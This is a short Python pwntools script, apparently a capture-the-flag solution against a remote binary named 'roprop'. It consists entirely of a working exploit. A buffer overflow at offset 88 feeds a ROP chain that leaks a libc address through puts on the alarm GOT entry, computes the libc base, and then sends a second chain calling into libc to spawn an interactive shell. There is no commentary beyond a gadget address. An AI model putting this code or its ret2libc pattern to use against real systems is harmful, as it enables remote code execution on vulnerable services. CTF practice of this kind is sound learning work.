#!/usr/bin/python3
from pwn import *
from time import sleep

# GATGETS
# 					0x0000000000400963: pop rdi; ret;
poprdi = 0x400963
ret = 0x400646

context.arch = "amd64"
bin = "./roprop"

host,port = "roprop.darkarmy.xyz",<port>

offset = 88
bina = ELF(bin)
binrop = ROP(bina)
binrop.call("puts", [bina.got["alarm"]])
binrop.call("main")

payload = b"A"*offset + binrop.chain()

#p = process(bin)
p = remote(host,port)
print (p.read())
p.sendline(payload)
sleep(1)
okunan = p.read()
leak = u64(okunan.split()[9].ljust(8,b"\x00")) - 0x0e48a0
print ("Libc base addres: ",hex(leak))

chain = p64(poprdi) + p64(leak+0x1b40fa) + p64(ret) + p64(leak+0x04f4e0) + p64(leak+0x431d0)


payload = b"A"*offset + chain
p.sendline(payload)
p.interactive()
